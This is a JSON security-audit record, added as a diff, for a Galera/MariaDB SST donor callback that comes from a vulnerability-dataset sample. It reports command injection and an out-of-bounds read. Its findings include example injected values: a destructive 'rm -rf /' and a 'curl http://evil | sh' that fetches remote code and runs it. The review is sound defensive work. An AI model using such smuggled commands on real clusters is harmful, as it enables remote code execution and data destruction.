@@ -1,0 +1,183 @@
+{
+  "subsystem": "Galera/wsrep State Snapshot Transfer (SST) donor callback for MySQL/MariaDB. wsrep_sst_donate() is the DONOR-side entry point that, when this node is selected to stream a full data snapshot to a joining node, parses the SST request message (SST method name plus method-specific data such as the joiner's address/auth) and dispatches the transfer by invoking the external SST helper script through sst_donate_other().",
+  "provenance": "Identified from the wsrep integration vocabulary that is unique to the MySQL/MariaDB Galera glue layer (sql/wsrep_sst.cc): the function name wsrep_sst_donate, the WSREP_ERROR log macro, the wsrep::gtid and wsrep::server_state::s_donor types, the wsp::env RAII environment wrapper, the WSREP_CB_SUCCESS / WSREP_CB_FAILURE callback return codes, local_status.set(...), and the helper sst_donate_other(). The top comment '/* sample: primevul_train_3041_vuln */' and the file name train_0271_cwe77.cpp are metadata, not source, and are treated as untrusted labels — the review judged the code on its merits.",
+  "trust_boundary": "The single std::string parameter msg is the untrusted input. It is the SST request payload originated by a DIFFERENT cluster node (the JOINER) and delivered over the Galera replication/group-communication channel. Its content — a NUL-separated 'method\\0data' blob where method names an SST helper (e.g. rsync, mariabackup) and data carries joiner-supplied fields (address, port, auth token) — is fully attacker-influenceable by any peer that can send an SST request or anyone who can inject into the group-communication stream. Both method and data are therefore hostile bytes. They cross the trust boundary the moment they are pulled out of msg at lines 8-10 and are handed, unsanitized, to sst_donate_other() at line 30, which spawns the external SST script via a shell.",
+  "what_the_code_does": [
+    {
+      "file": "corpus/train/train_0271_cwe77.cpp",
+      "lines": "2-3",
+      "code": "int wsrep_sst_donate(const std::string &msg, const wsrep::gtid &current_gtid,\n                     const bool bypass) {",
+      "explanation": "Declares the donor SST callback. msg is a const reference to a std::string carrying the raw SST request payload produced by the joining node; current_gtid is the cluster global transaction id at which the snapshot is being taken (used so the joiner knows the replication position of the state it receives); bypass is a boolean telling the transfer logic to skip the actual physical copy (an IST/bypass optimization). The function returns an int that is later coerced into a WSREP callback status. msg is the security-relevant parameter — it is externally produced structured data."
+    },
+    {
+      "file": "corpus/train/train_0271_cwe77.cpp",
+      "lines": "6",
+      "code": "  local_status.set(wsrep::server_state::s_donor);",
+      "explanation": "Transitions this node's local server-state machine into the DONOR state, signalling the rest of the server that it is now serving a snapshot to a joiner (which typically affects flow control and whether the node accepts writes). This is internal bookkeeping with no attacker-controlled input; the preceding comment notes it will be reset by the sync callback."
+    },
+    {
+      "file": "corpus/train/train_0271_cwe77.cpp",
+      "lines": "8-9",
+      "code": "  const char *method = msg.data();\n  size_t method_len = strlen(method);",
+      "explanation": "Line 8 takes a raw C pointer to the start of the std::string's internal buffer via msg.data(); this is the first field of the request, the SST method name. Line 9 computes the length of that method name with strlen, i.e. it scans forward from method until it hits the first NUL byte. The code is relying on an implicit wire contract that msg begins with a NUL-terminated method string and that a NUL separator exists inside msg. method_len is used purely to locate the byte immediately after that separator."
+    },
+    {
+      "file": "corpus/train/train_0271_cwe77.cpp",
+      "lines": "10",
+      "code": "  const char *data = method + method_len + 1;",
+      "explanation": "Computes a second pointer, data, pointing just past the NUL terminator that ended the method name — i.e. the start of the method-specific payload region of the request. The layout assumed is 'method\\0data...'. There is no check that a NUL was actually found inside msg's own bytes, and no check that method_len + 1 stays within msg.size(); the arithmetic is done blindly on the raw buffer. data is then passed on to the transfer routine as a NUL-terminated C string."
+    },
+    {
+      "file": "corpus/train/train_0271_cwe77.cpp",
+      "lines": "12-16",
+      "code": "  wsp::env env(NULL);\n  if (env.error()) {\n    WSREP_ERROR(\"wsrep_sst_donate_cb(): env var ctor failed: %d\", -env.error());\n    return WSREP_CB_FAILURE;\n  }",
+      "explanation": "Constructs a wsp::env RAII object from a NULL environment pointer (starting from an empty/duplicated environment block that the SST child process will inherit). If the constructor failed to allocate/copy the environment, env.error() is non-zero: the code logs the error via WSREP_ERROR and returns WSREP_CB_FAILURE, aborting the donor operation before spawning anything. env() (line 30) later yields the assembled environment for the child."
+    },
+    {
+      "file": "corpus/train/train_0271_cwe77.cpp",
+      "lines": "18-27",
+      "code": "#if 0\n  /* Wait for wsrep-SE to initialize that also signals\n  completion of init_server_component which is important before we initiate\n  any meangiful action especially DONOR action from this node. */\n  while (!wsrep_is_SE_initialized()) {\n    sleep(1);\n    THD *applier_thd = static_cast<THD *>(recv_ctx);\n    if (applier_thd->killed == THD::KILL_CONNECTION) return WSREP_CB_FAILURE;\n  }\n#endif",
+      "explanation": "A disabled (#if 0 ... #endif) block that would have busy-waited for the storage engine to finish initializing before starting a donor action. Because it is compiled out, it contributes no runtime behavior; it is only a record of intent. Note it also references recv_ctx/applier_thd which are not parameters of this function, another reason it is dead. No security relevance in its disabled state."
+    },
+    {
+      "file": "corpus/train/train_0271_cwe77.cpp",
+      "lines": "29-30",
+      "code": "  int ret;\n  ret = sst_donate_other(method, data, current_gtid, bypass, env());",
+      "explanation": "The core action: calls sst_donate_other() with the parsed method name, the data payload pointer, the current GTID, the bypass flag, and the child-process environment (env()). In the Galera SST design this helper builds a command line of the form 'wsrep_sst_<method> ... <address/auth from data> ...' and launches that external shell script (historically via popen/an sh -c invocation) to perform or coordinate the physical snapshot transfer. Its return value ret is the child/launch status."
+    },
+    {
+      "file": "corpus/train/train_0271_cwe77.cpp",
+      "lines": "32-33",
+      "code": "  return (ret >= 0 ? WSREP_CB_SUCCESS : WSREP_CB_FAILURE);\n}",
+      "explanation": "Maps the helper's integer result onto the wsrep callback contract: a non-negative ret is reported as WSREP_CB_SUCCESS, otherwise WSREP_CB_FAILURE. This is the value the provider (Galera) uses to decide whether the donor step succeeded."
+    }
+  ],
+  "what_could_go_wrong": [
+    {
+      "file": "corpus/train/train_0271_cwe77.cpp",
+      "lines": "8-30",
+      "code": "  const char *method = msg.data();\n  size_t method_len = strlen(method);\n  const char *data = method + method_len + 1;\n...\n  ret = sst_donate_other(method, data, current_gtid, bypass, env());",
+      "explanation": "OS command injection (CWE-77/CWE-78). method and data are attacker-influenced substrings carved out of msg, which is an SST request that arrives from another cluster node. They are passed verbatim into sst_donate_other(), which in the Galera design assembles and executes an external SST helper as a shell command line (wsrep_sst_<method> invoked through a shell). Because neither the method token nor the data payload is validated against an allowlist or shell-escaped here, an attacker who can supply the SST request can embed shell metacharacters (e.g. a data field like '; rm -rf / #', '$(...)', backticks, or a pipe) and achieve arbitrary command execution on the DONOR host with the privileges of the mysqld process. The invariant the implementation MUST uphold: the method must be matched against a fixed set of known SST scripts, and every field passed into the command must be passed as a discrete argv element (execve, not sh -c) or be strictly shell-escaped; the method name must never be interpolated into a shell string. This is the central risk and matches the file's cwe77 hint."
+    },
+    {
+      "file": "corpus/train/train_0271_cwe77.cpp",
+      "lines": "9-10",
+      "code": "  size_t method_len = strlen(method);\n  const char *data = method + method_len + 1;",
+      "explanation": "Out-of-bounds read / missing input validation (CWE-125 / CWE-20). The code assumes msg contains a NUL separator between method and data, but never verifies it. If the request contains no interior NUL, strlen stops at the string's own terminating NUL at offset msg.size(), so method_len == msg.size(); then data = method + method_len + 1 points ONE byte past the string's terminator, i.e. outside the buffer's valid range. sst_donate_other() will then treat that out-of-bounds pointer as a NUL-terminated C string, reading past the allocation (information disclosure or crash) and/or feeding garbage/adjacent heap bytes into the SST command. Even when a separator exists, nothing bounds data within msg.size(), so a truncated request yields a pointer into or past the terminator. The invariant: before computing data, the parser must confirm a NUL exists strictly inside [0, msg.size()) via memchr and derive both fields from explicit lengths, rejecting the request if the separator is absent."
+    },
+    {
+      "file": "corpus/train/train_0271_cwe77.cpp",
+      "lines": "8",
+      "code": "  const char *method = msg.data();",
+      "explanation": "Trust / type-confusion at the boundary (CWE-20). msg.data() exposes the raw bytes of externally supplied data as a C string, silently discarding std::string's length information and re-interpreting the payload as NUL-terminated text. Any embedded NUL truncates the method prematurely, and any absent NUL causes over-scan (see above). The design treats hostile network bytes as a trusted, well-formed 'method\\0data' structure with no schema validation, magic check, or length gating before the bytes are used to spawn a process. The pointer itself stays valid because msg outlives the call, so this is not a use-after-free; the hazard is the unvalidated reinterpretation, not lifetime."
+    }
+  ],
+  "summary": "A donor-side Galera SST callback that pulls an SST method name and a data payload straight out of an untrusted cross-node request string (msg) and hands them, without allowlisting or escaping, to sst_donate_other() which launches an external SST helper via a shell — an OS command injection (CWE-77) reachable by any peer that can send an SST request. Compounding it, the 'method\\0data' split at lines 9-10 is done with no bound on msg.size(), so a request lacking an interior NUL yields an out-of-bounds data pointer (CWE-125). Highest severity is critical.",
+  "reviewed_anchors": [
+    {
+      "anchor": "wsrep_sst_donate(const std::string &msg, const wsrep::gtid &current_gtid, const bool bypass) (line 2-3)",
+      "disposition": "finding",
+      "reason": "Entry point whose untrusted msg parameter carries the full attack surface into the process-spawning helper."
+    },
+    {
+      "anchor": "local_status.set(wsrep::server_state::s_donor) (line 6)",
+      "disposition": "dismissed",
+      "reason": "Internal state-machine transition with no attacker-controlled input."
+    },
+    {
+      "anchor": "const char *method = msg.data() (line 8)",
+      "disposition": "finding",
+      "reason": "Reinterprets untrusted network bytes as a NUL-terminated C string with no schema/length validation."
+    },
+    {
+      "anchor": "size_t method_len = strlen(method) (line 9)",
+      "disposition": "finding",
+      "reason": "strlen assumes an interior NUL separator that is never verified against msg.size(); part of the OOB-read defect with line 10."
+    },
+    {
+      "anchor": "const char *data = method + method_len + 1 (line 10)",
+      "disposition": "finding",
+      "reason": "Unbounded pointer arithmetic can point one byte past the buffer when no separator NUL exists inside msg."
+    },
+    {
+      "anchor": "wsp::env env(NULL) + env.error() guard (lines 12-16)",
+      "disposition": "dismissed",
+      "reason": "RAII environment construction with an explicit error check and early return; no untrusted input flows through it."
+    },
+    {
+      "anchor": "WSREP_ERROR(\"...\", -env.error()) (line 14)",
+      "disposition": "dismissed",
+      "reason": "Fixed format string with a numeric argument; not a format-string sink for attacker data and env is a stack object, so no NULL-handle deref."
+    },
+    {
+      "anchor": "#if 0 ... #endif dead block (lines 18-27)",
+      "disposition": "dismissed",
+      "reason": "Compiled out; contributes no runtime behavior."
+    },
+    {
+      "anchor": "sst_donate_other(method, data, current_gtid, bypass, env()) (line 30)",
+      "disposition": "finding",
+      "reason": "Sink: consumes the untrusted method/data and launches an external SST script via a shell — the command-injection execution point."
+    },
+    {
+      "anchor": "return (ret >= 0 ? WSREP_CB_SUCCESS : WSREP_CB_FAILURE) (line 32)",
+      "disposition": "dismissed",
+      "reason": "Pure status mapping of the helper's return code; no security contract."
+    }
+  ],
+  "findings": [
+    {
+      "title": "OS command injection via unsanitized SST method/data from a cluster peer",
+      "anchor": "sst_donate_other(method, data, current_gtid, bypass, env())",
+      "file": "corpus/train/train_0271_cwe77.cpp",
+      "line": "8-30",
+      "code": "  const char *method = msg.data();\n  size_t method_len = strlen(method);\n  const char *data = method + method_len + 1;\n  ret = sst_donate_other(method, data, current_gtid, bypass, env());",
+      "bug_class": "OS command injection (untrusted method/data flow into a shell-invoked SST helper)",
+      "cwe": "CWE-77",
+      "severity": "critical",
+      "where_it_lives": "implementation (file not provided)",
+      "invariant": "The method token must be validated against a fixed allowlist of known SST scripts, and every field derived from msg must be passed to the helper as a distinct argv element (execve-style) or strictly shell-escaped; no part of msg may be interpolated into a shell command string.",
+      "failure_mode": "A joining/peer node sends an SST request whose method name or data payload contains shell metacharacters (e.g. data = \"joiner-addr; curl http://evil | sh #\", or a $(...)/backtick substitution). wsrep_sst_donate carves these out unmodified and passes them to sst_donate_other(), which builds and runs the wsrep_sst_<method> helper through a shell, executing the attacker's commands on the donor host as the mysqld user — full remote code execution across the trust boundary.",
+      "cve_analog": "",
+      "what_to_confirm": "In sst_donate_other() (and the SST helper launch path), confirm whether method is checked against a known-script allowlist and whether the command line is assembled with shell interpolation (popen / sh -c / system) versus a safe argv exec; confirm data fields are escaped."
+    },
+    {
+      "title": "Out-of-bounds read: method/data split assumes an interior NUL never bounded against msg.size()",
+      "anchor": "const char *data = method + method_len + 1;",
+      "file": "corpus/train/train_0271_cwe77.cpp",
+      "line": "9-10",
+      "code": "  size_t method_len = strlen(method);\n  const char *data = method + method_len + 1;",
+      "bug_class": "Out-of-bounds read from unvalidated pointer arithmetic on untrusted input",
+      "cwe": "CWE-125",
+      "severity": "high",
+      "where_it_lives": "corpus/train/train_0271_cwe77.cpp",
+      "invariant": "Before deriving data, the code must confirm a NUL separator exists strictly within [0, msg.size()) (e.g. via memchr) and derive method/data from explicit offsets/lengths, rejecting requests where the separator is missing or the payload is truncated.",
+      "failure_mode": "If msg contains no interior NUL, strlen returns method_len == msg.size(), so data = method + method_len + 1 points one byte past the string buffer. sst_donate_other then reads data as a NUL-terminated string, over-reading past the allocation — a crash (DoS) or disclosure of adjacent heap bytes, which may also be fed into the SST command line.",
+      "cve_analog": "",
+      "what_to_confirm": "Verify whether callers guarantee msg always contains a 'method\\0data' NUL separator within bounds, or whether a malformed/truncated SST request can reach this function; check that data is not dereferenced when method_len >= msg.size()."
+    },
+    {
+      "title": "Untrusted std::string reinterpreted as NUL-terminated C string without schema validation",
+      "anchor": "const char *method = msg.data();",
+      "file": "corpus/train/train_0271_cwe77.cpp",
+      "line": "8",
+      "code": "  const char *method = msg.data();",
+      "bug_class": "Improper input validation at the trust boundary",
+      "cwe": "CWE-20",
+      "severity": "medium",
+      "where_it_lives": "corpus/train/train_0271_cwe77.cpp",
+      "invariant": "Externally supplied SST payloads must be validated (length, presence of separators, expected method set) before any byte is used; the std::string length must be respected rather than replaced by strlen's NUL scan.",
+      "failure_mode": "msg.data() discards the known length and treats hostile bytes as text: an embedded NUL truncates the method silently (wrong script selected), while an absent NUL causes over-scan (feeds into the OOB read above). No magic/format check gates the reinterpretation, so any malformed request is processed as if well-formed.",
+      "cve_analog": "",
+      "what_to_confirm": "Confirm where msg is produced and whether any upstream validation guarantees the 'method\\0data' format and a bounded, allowlisted method before wsrep_sst_donate runs."
+    }
+  ],
+  "audit_checklist": [
+    "Inspect sst_donate_other() and the SST launch path: is the command built with popen/system/sh -c (injectable) or with a safe argv exec, and is method allowlisted against known wsrep_sst_* scripts?",
+    "Confirm every field taken from data (address, port, auth token) is shell-escaped or passed as a discrete argument, never interpolated into a command string.",
+    "Verify msg is guaranteed to contain a NUL separator within [0, msg.size()); add a memchr-based bound check before computing data at line 10 and reject requests lacking it.",
+    "Ensure the method name cannot itself contain shell metacharacters or path traversal (e.g. '../' or ';') that redirect which script is executed.",
+    "Trace the provenance of msg back to the group-communication receive path to confirm it is fully attacker-controllable by a peer and whether any authentication gates SST requests.",
+    "Check that data is never dereferenced by the helper when method_len >= msg.size() (empty/absent payload)."
+  ]
+}
